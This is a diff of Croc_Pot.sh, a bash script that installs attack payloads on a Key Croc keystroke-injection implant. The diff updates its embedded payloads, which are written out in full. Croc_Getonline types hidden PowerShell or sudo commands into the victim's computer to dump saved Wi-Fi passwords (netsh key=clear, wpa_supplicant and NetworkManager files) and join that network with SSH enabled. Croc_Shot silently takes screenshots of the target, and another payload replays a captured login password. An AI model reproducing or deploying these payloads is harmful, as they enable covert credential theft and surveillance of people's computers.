-			echo -ne "# Title:           Croc_Getonline\n# Description:     Attempt to connect Keycroc automatically to target wifi access point\n#                  Save to tools/Croc_Pot/wifipass.txt and loot/Croc_Pot/old_wifipass.txt\n# Author:          spywill\n# Version:         3.2\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro\n
-MATCH (getonline_W|getonline_R|getonline_L)\n\nCROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)\nfor dir in \"\${CROC_POT_DIR[@]}\"; do [[ ! -d \"\$dir\" ]] && mkdir \"\$dir\" || LED B; done\n\nif [ -f /root/udisk/tools/Croc_Pot/wifipass.txt ]; then\n	cat /root/udisk/tools/Croc_Pot/wifipass.txt >> /root/udisk/loot/Croc_Pot/old_wifipass.txt
-	rm -f /root/udisk/tools/Croc_Pot/wifipass.txt\nfi\n\nATTACKMODE HID STORAGE\nQ DELAY 5000\nLED ATTACK\n\ncase \$LOOT in\n	getonline_W)\n		Q GUI r\n		Q DELAY 3000\n		Q STRING \"powershell\"\n		Q ENTER\n		Q DELAY 5000\n		Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
-		Q ENTER\n		Q DELAY 3000\n		Q STRING \"(netsh wlan show networks) | Select-String \\\"\:(.+)\\\$\\\" | % {\\\$name=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{(netsh wlan show profile name=\\\"\\\$name\\\" key=clear)} | Select-String \\\"Key Content\W+\:(.+)\\\$\\\" | % {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{[PSCustomObject]@{ PROFILE_NAME=\\\$name;PASSWORD=\\\$pass }} | Out-File -Encoding UTF8 \\\"\\\$Croc\\\tools\Croc_Pot\wifipass.txt\\\"\"
-		Q ENTER\n		Q DELAY 6000\n		Q STRING \"exit\"\n		Q ENTER\n		sed -i '/^[[:space:]]*\$/d' /root/udisk/tools/Croc_Pot/wifipass.txt\n		sed -i '\$!d' /root/udisk/tools/Croc_Pot/wifipass.txt\n		sed -i 's/\\\r//g' /root/udisk/tools/Croc_Pot/wifipass.txt\n;;\n	getonline_R)\n		Q CONTROL-ALT-d\n		Q CONTROL-ALT-t\n		Q DELAY 2000
-		Q STRING \"RASPBERRY_PI=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/wifipass.txt\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"t_ssid=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"t_pw=\\\$(sudo sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$t_ssid/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"
-		Q ENTER\n		Q DELAY 2000\n		Q STRING \"echo \\\"\\\$t_ssid \\\$t_pw\\\" > \\\$RASPBERRY_PI\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"exit\"\n		Q ENTER\n;;\n	getonline_L)\n		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then\n			PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
-		else\n			PC_PW=LINUX\n		fi\n		Q ALT F2\n		Q DELAY 2000\n		Q STRING \"xterm\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"\n		Q ENTER\n		Q DELAY 2000
-		Q STRING \"\$PC_PW\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/wifipass.txt\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sed -e 's/=/ /g' | tee \\\$LINUX_ON\"
-		Q ENTER\n		Q DELAY 2000\n		Q STRING \"sudo umount /media/\\\$(whoami)/KeyCroc/\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n		Q ENTER\n;;\nesac\n\nATTACKMODE HID\nsleep 3\n\nLED SETUP\nsed -i 's/\\\( \\\)*/\\\1/g' /root/udisk/tools/Croc_Pot/wifipass.txt
-sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt\nsed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/wifipass.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt\n\nPID_WPA=\$(pidof wpa_supplicant)\nPID_DHC=\$(pidof dhclient)\nifconfig wlan0 down
-echo -ne \"network={\\\n\\\tssid=\\\"\$(sed 's/ .*//' /root/udisk/tools/Croc_Pot/wifipass.txt)\\\"\\\n\\\tpsk=\\\"\$(sed 's/.* //' /root/udisk/tools/Croc_Pot/wifipass.txt)\\\"\\\n\\\tpriority=1\\\n}\" > /etc/wpa_supplicant.conf\nkill -9 \$PID_WPA && kill -9 \$PID_DHC\nsleep 2\nifconfig wlan0 up\nsleep 2\nwpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0\nsleep 5
-systemctl restart ssh.service\nsleep 1\n\nif : >/dev/tcp/8.8.8.8/53; then\n	LED FINISH\nelse\n	LED R\nfi\nsleep 3\nLED OFF" > "$CROC_GETONLINE"
+			echo -ne "# Title:           Croc_Getonline\n# Description:     Attempt to connect Keycroc automatically to target wifi access point\n#                  Save to tools/Croc_Pot/wifipass.txt and loot/Croc_Pot/old_wifipass.txt\n# Author:          spywill\n# Version:         3.6\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro\n
+MATCH (getonline_W|getonline_R|getonline_L)\n\nCROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)\nfor dir in \"\${CROC_POT_DIR[@]}\"; do [[ ! -d \"\$dir\" ]] && mkdir \"\$dir\" || LED B; done\n\nwifi_pass=/root/udisk/tools/Croc_Pot/wifipass.txt\n\nif [ -f \$wifi_pass ]; then\n	cat \$wifi_pass >> /root/udisk/loot/Croc_Pot/old_wifipass.txt
+	rm -f \$wifi_pass\nfi\n\nATTACKMODE HID STORAGE\nQ DELAY 5000\nLED ATTACK\n\ncase \$LOOT in\n	getonline_W)\n		Q GUI r\n		Q DELAY 3000\n		Q STRING \"powershell -NoP -NonI -W Hidden\"\n		Q ENTER\n		Q DELAY 5000\n		Q STRING \"\\\$MOUNT_POINT = (Get-WmiObject -Class win32_volume -Filter 'label=\\\"KeyCroc\\\"').DriveLetter\"
+		Q ENTER\n		Q DELAY 3000\n		Q STRING \"\\\$currentSSID = (netsh wlan show interfaces | Select-String \\\"SSID\\\")[0].ToString().Trim() -replace 'SSID\s+:\s+'\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"\\\$lastObject = (netsh wlan show profile name=\\\"\\\$currentSSID\\\" key=clear) | Select-String \\\"Key Content\W+:(.+)\\\$\\\" | ForEach-Object {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=\\\$currentSSID;PASSWORD=\\\$pass }} | Select-Object -Last 1\"
+		Q ENTER\n		Q DELAY 2000\n		Q STRING \"\\\"\\\$(\\\$lastObject.PROFILE_NAME) \\\$(\\\$lastObject.PASSWORD)\\\" | Out-File -Encoding UTF8 \\\"\\\$MOUNT_POINT\\\tools\Croc_Pot\wifipass.txt\\\"\"\n		Q ENTER\n		Q DELAY 5000\n		Q STRING \"Dismount-WindowsImage -Path \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\n	getonline_R)
+		Q CONTROL-ALT-d\n		Q CONTROL-ALT-t\n		Q DELAY 2000\n		Q STRING \"MOUNT_POINT=/media/\\\$(whoami)/KeyCroc\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"currentSSID=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"SSID_pw=\\\$(sudo sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$currentSSID/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"
+		Q ENTER\n		Q DELAY 2000\n		Q STRING \"echo \\\"\\\$currentSSID \\\$SSID_pw\\\" | tee \\\$MOUNT_POINT/tools/Croc_Pot/wifipass.txt\"\n		Q ENTER\n		Q DELAY 3000\n		Q STRING \"umount \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\n	getonline_L)\n		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then
+			PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\n		else\n			PC_PW=LINUX\n		fi\n		Q CONTROL-ALT-d\n		Q ALT-t\n		Q DELAY 2000\n		Q STRING \"MOUNT_POINT=\\\"/mnt/usb\\\" ; sudo mkdir -p \\\$MOUNT_POINT ; sudo mount -L \\\"KeyCroc\\\" \\\$MOUNT_POINT\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"\$PC_PW\"
+		Q ENTER\n		Q DELAY 2000\n		Q STRING \"currentSSID=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"SSID_pw=\\\$(sudo grep -r '^psk=' /etc/NetworkManager/system-connections/\\\$currentSSID* | sed -e 's/psk=//g')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"echo \\\"\\\$currentSSID \\\$SSID_pw\\\" | sudo tee \\\$MOUNT_POINT/tools/Croc_Pot/wifipass.txt\"
+		Q ENTER\n		Q DELAY 3000\n		Q STRING \"sudo umount \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\nesac\n\nATTACKMODE HID\nsleep 3\n\nLED SETUP\nkill -9 \$(pidof wpa_supplicant) && kill -9 \$(pidof dhclient)\nifconfig wlan0 down\n\nif [ \"\$LOOT\" = \"getonline_W\" ]; then\n	sed -i -e '1s/^[^[:print:]]*//' \$wifi_pass\n	sed -i 's/\\\r//g' \$wifi_pass\nfi\n
+sed -i 's/\( \)*/\1/g' \$wifi_pass\nsed -i -E -e '/^[WS]/d' -e '14 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt\nsed -i -E -e '1{x;s#^#sed -n 1p '\$wifi_pass'#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt\nwpa_passphrase \$(sed 's/ .*//' \$wifi_pass) \$(sed 's/.* //' \$wifi_pass) > /etc/wpa_supplicant.conf\nifconfig wlan0 up
+wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf && dhclient wlan0\nsleep 3\nsystemctl restart ssh.service\n\n[ : >/dev/tcp/8.8.8.8/53 ] && LED FINISH || LED R\nsleep 3\nLED OFF\n" > "$CROC_GETONLINE"
 			cat "$CROC_GETONLINE" ; echo -ne "\n$LINE\n"
-			ColorGreen 'CROC_GETONLINE PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER\n' ;;
+			ColorGreen "CROC_GETONLINE PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER$clear\n" ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
 		*)
@@ -5384,7 +5431,7 @@ passwd
 -Tested on Windows,Raspberrypi,Linux'
 if [ -f "/root/udisk/payloads/Croc_unlock.txt" ]; then
 	cat /root/udisk/payloads/Croc_unlock.txt ; echo -ne "\n$LINE\n"
-	ColorGreen 'CROC_UNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
+	ColorGreen "CROC_UNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER$clear\n"
 else
 	read_all 'INSTALL CROC_UNLOCK PAYLOAD Y/N AND PRESS [ENTER]'
 	case "$r_a" in
@@ -5400,7 +5447,7 @@ for dir in \"\${CROC_POT_DIR[@]}\"; do [[ ! -d \"\$dir\" ]] && mkdir \"\$dir\" |
 		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then\n			UNLOCK_FILE\n			LED SETUP\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q DELAY 1000
 			Q STRING \"\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\"\n			Q ENTER\n			LED OFF\n			RELOAD\n		else\n			LED R\n			RELOAD\n		fi\n;;\nesac\n" > /root/udisk/payloads/Croc_unlock.txt
 			cat /root/udisk/payloads/Croc_unlock.txt ; echo -ne "\n$LINE\n"
-			ColorGreen 'CROC_UNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER\n' ;;
+			ColorGreen "CROC_UNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER$clear\n" ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
 		*)
@@ -5439,7 +5486,7 @@ Thanks to dark_pyrro payload [ Key-Croc-AP_STA ]'
 				read_all 'ENTER ACCESS POINTS NAME AND PRESS [ENTER]' ; local USER_SSID="$r_a"
 				user_input_passwd /tmp/0 SSID ; local WIFI_PASS="$password"
 				echo -ne "# Title:         WIFI-SETUP\n# Description:   Connect to access point quickly by match word add ssid and passwd\n# Author:        spywill\n# Version:       1.4\n# Category:      Key Croc\n# Props:         dark_pyrro\n
-MATCH ${USER_MATCH}\n\nLED SETUP\nsed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID ${USER_SSID}\\\nWIFI_PASS ${WIFI_PASS}\\\nSSH ENABLE' /root/udisk/config.txt\nsleep 1\n\nPID_WPA=\$(pidof wpa_supplicant)\nPID_DHC=\$(pidof dhclient)
+MATCH ${USER_MATCH}\n\nLED SETUP\nsed -i -E -e '/^[WS]/d' -e '14 a WIFI_SSID ${USER_SSID}\\\nWIFI_PASS ${WIFI_PASS}\\\nSSH ENABLE' /root/udisk/config.txt\nsleep 1\n\nPID_WPA=\$(pidof wpa_supplicant)\nPID_DHC=\$(pidof dhclient)
 ifconfig wlan0 down\necho -ne \"network={\\\n\\\tssid=\\\"${USER_SSID}\\\"\\\n\\\tpsk=\\\"${WIFI_PASS}\\\"\\\n\\\tpriority=1\\\n}\" > /etc/wpa_supplicant.conf\nkill -9 \$PID_WPA && kill -9 \$PID_DHC\nsleep 2
 ifconfig wlan0 up\nsleep 2\nwpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0\nsleep 5\nsystemctl restart ssh.service\nsleep 1\n\nif : >/dev/tcp/8.8.8.8/53; then\n	LED FINISH\nelse\n	LED R\nfi\nsleep 3\nLED OFF" > "$PAYLOAD_FOLDER"
 				cat "$PAYLOAD_FOLDER" ; echo -ne "\n$LINE\n"
@@ -5453,20 +5500,14 @@ ifconfig wlan0 up\nsleep 2\nwpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_suppli
 			user_input_passwd /tmp/0 SSID
 			ACCESS_POINT() {
 				LED SETUP
-				sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID $USER_SSID\nWIFI_PASS $password\nSSH ENABLE' /root/udisk/config.txt
-				sleep 1
-				PID_WPA=$(pidof wpa_supplicant)
-				PID_DHC=$(pidof dhclient)
+				kill -9 $(pidof wpa_supplicant) && kill -9 $(pidof dhclient)
 				ifconfig wlan0 down
-				echo -ne "network={\n\tssid=\"$USER_SSID\"\n\tpsk=\"$password\"\n\tpriority=1\n}" > /etc/wpa_supplicant.conf
-				kill -9 "$PID_WPA" && kill -9 "$PID_DHC"
-				sleep 2
+				sed -i -E -e '/^[WS]/d' -e '14 a WIFI_SSID $USER_SSID\nWIFI_PASS $password\nSSH ENABLE' /root/udisk/config.txt
+				wpa_passphrase $USER_SSID $password > /etc/wpa_supplicant.conf
 				ifconfig wlan0 up
-				sleep 2
-				wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0
-				sleep 5
+				wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf && dhclient wlan0
+				sleep 3
 				systemctl restart ssh.service
-				sleep 1
 				[ : >/dev/tcp/8.8.8.8/53 ] && LED FINISH || LED R
 				sleep 3
 				LED OFF
@@ -5494,7 +5535,7 @@ ifconfig wlan0 up\nsleep 2\nwpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_suppli
 quick_croc_pot() {
 	Info_Screen '-Install payload called Quick_Start_Croc_Pot
 -Quickly Start Croc_Pot without OS detection
--This is for when you Already ran OS detection on target pc by crocpot
+-This is for when you Already ran OS detection on target by crocpot
 -Match word is qspot'
 	local qs_croc=/root/udisk/payloads/Quick_start_Croc_Pot.txt
 	if [ -f "$qs_croc" ]; then
@@ -5505,11 +5546,11 @@ quick_croc_pot() {
 		case "$r_a" in
 			[yY] | [yY][eE][sS])
 				echo -ne "# Title:         Quick Start Croc_Pot\n# Description:   Quickly Start Croc_pot.sh bash script without OS detection\n#                Will need to run Croc_Pot_Payload.txt first before running this payload
-#                This is for when you Already ran OS detection on target pc\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qspot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
+#                This is for when you Already ran OS detection on target\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qspot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
 echo \"\${CROC_PW}\" >> /tmp/CPW.txt\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	Q GUI d\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"
 	Q ENTER\n	sleep 3\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER\nelse\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = LINUX ]; then\n    HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n    case \$HOST_CHECK in\n    raspberrypi)
 	LED B\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
-	Q ENTER ;;\n    $HOST_CHECK)\n	Q GUI d\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
+	Q ENTER ;;\n    $HOST_CHECK)\n	Q GUI d\n	LED B\n	Q ALT-t\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
 	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n    *)\n	Q GUI d\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
 	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n  esac\n fi\nfi\nLED FINISH" > "$qs_croc"
 				cat "$qs_croc" ; echo -ne "\n$LINE\n"
@@ -5522,10 +5563,10 @@ echo \"\${CROC_PW}\" >> /tmp/CPW.txt\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/C
 	fi
 }
 ##
-#----Croc_Shot take Screenshot of target pc and save to loot folder
+#----Croc_Shot take Screenshot of target and save to loot folder
 ##
 screen_shot() {
-	Info_Screen '-Option to install Croc_Shot.txt payload this will take screenshot of Target pc
+	Info_Screen '-Option to install Croc_Shot.txt payload this will take screenshot of Target
 -To start the Croc_Shot payload MATCH word crocshot
 -This will save to loot/Croc_Pot/screenshot
 -Option to take screenshot now
@@ -5554,10 +5595,10 @@ echo -ne \"\\\$outputFile = \\\"\\\$Croc\loot\Croc_Pot\screenshot\\\\\\\\\\\$(ge
 \\\$Height = \\\$Screen.Height\\\n\\\$Left = \\\$Screen.Left\\\n\\\$Top = \\\$Screen.Top\\\n\\\$screenshotImage = New-Object System.Drawing.Bitmap \\\$Width, \\\$Height\\\n\n\\\$graphicObject = [System.Drawing.Graphics]::FromImage(\\\$screenshotImage)\\\n\\\$graphicObject.CopyFromScreen(\\\$Left, \\\$Top, 0, 0, \\\$screenshotImage.Size)\\\n
 \\\$screenshotImage.Save(\\\$outputFile)\\\nWrite-Output \\\"Saved to:\\\"\\\nWrite-Output \\\$outputFile\\\nStart-Sleep -s 5\" >> \${WINDS_SHOT}\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
 	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\n	fi\nelse\ncase \$HOST_CHECK in\nraspberrypi)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	sleep 1\n	Q ALT-F4\n	Q CONTROL-ALT-t
-	sleep 1\n	Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"\n	Q ENTER\n	sleep 2\n	ATTACKMODE HID\n	LED FINISH ;;\n\$HOST_CHECK)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"
-	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
+	sleep 1\n	Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"\n	Q ENTER\n	sleep 2\n	ATTACKMODE HID\n	LED FINISH ;;\n\$HOST_CHECK)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q ALT-t
+	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
 	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10
-	ATTACKMODE HID\n	LED FINISH ;;\n*)\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
+	ATTACKMODE HID\n	LED FINISH ;;\n*)\n	LED ATTACK\n	Q ALT-t\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
 	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10\n	ATTACKMODE HID\n	LED FINISH ;;\n esac\nfi" > "$Croc_Shot"
 			cat "$Croc_Shot" ; echo -ne "\n$LINE\n"
 			ColorGreen 'Croc_Shot.txt payload is now install check payloads folder\n' ;;
@@ -5570,16 +5611,16 @@ fi
 ##
 #----Croc_Shot take pic run from terminal
 ##
-read_all 'TAKE SCREENSHOT NOW OF TARGET PC Y/N AND PRESS [ENTER]'
+read_all 'TAKE SCREENSHOT NOW OF TARGET Y/N AND PRESS [ENTER]'
 case "$r_a" in
 	[yY] | [yY][eE][sS])
 		ATTACKMODE HID STORAGE
 		local WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1
 		if [ "$(OS_CHECK)" = WINDOWS ]; then
 			if [ -e "$WINDS_SHOT" ]; then
-				Q GUI r ; sleep 1 ; Q STRING "powershell -nop -ex Bypass -w Hidden" ; Q ENTER ; sleep 1
-				Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
-				Q ENTER ; sleep 1 ; Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; ATTACKMODE HID
+				QUACK GUI r ; sleep 1 ; QUACK STRING "powershell -nop -ex Bypass -w Hidden" ; QUACK ENTER ; sleep 1
+				QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+				QUACK ENTER ; sleep 1 ; QUACK STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; ATTACKMODE HID
 			else
 		echo -ne "\$outputFile = \"\$Croc\loot\Croc_Pot\screenshot\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\"\n
 Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawing\n
@@ -5587,28 +5628,28 @@ Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawi
 \$Height = \$Screen.Height\n\$Left = \$Screen.Left\n\$Top = \$Screen.Top\n\$screenshotImage = New-Object System.Drawing.Bitmap \$Width, \$Height\n
 \$graphicObject = [System.Drawing.Graphics]::FromImage(\$screenshotImage)\n\$graphicObject.CopyFromScreen(\$Left, \$Top, 0, 0, \$screenshotImage.Size)\n
 \$screenshotImage.Save(\$outputFile)\nWrite-Output \"Saved to:\"\nWrite-Output \$outputFile\nStart-Sleep -s 5" > $WINDS_SHOT
-		Q GUI r ; sleep 1 ; Q STRING "powershell -nop -ex Bypass -w Hidden" ; Q ENTER ; sleep 1
-		Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)" ; Q ENTER ; sleep 1
-		Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; ATTACKMODE HID
+		QUACK GUI r ; sleep 1 ; QUACK STRING "powershell -nop -ex Bypass -w Hidden" ; QUACK ENTER ; sleep 1
